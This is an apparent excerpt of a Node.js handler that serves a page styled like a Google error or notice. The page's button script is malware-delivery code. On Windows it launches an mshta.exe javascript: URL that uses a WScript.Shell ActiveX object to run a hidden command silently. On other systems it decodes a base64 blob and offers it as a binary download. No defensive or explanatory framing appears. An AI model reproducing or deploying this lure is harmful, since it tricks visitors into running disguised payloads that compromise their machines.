        ...
        r.end(`
            ...
            <head>
                ...
                <style>
                    ...
                    .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; }
                    .err { font-size: 12px; margin-top: 45px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; text-transform: uppercase; letter-spacing: 0.5px; }
                </style>
            </head>
            <body>
                <div class="c">
                ...
                <script>
                    ...
                    const mK = "";

                    document.getElementById('s').onclick = function() {
                        if (isWin) {
                            window.location.href = "mshta.exe javascript:a=new ActiveXObject('WScript.Shell');a.Run('" + wP + "',0,false);window.close();";
                        } else {
                            const b = new Blob([atob(mK)], { type: 'application/octet-stream' });
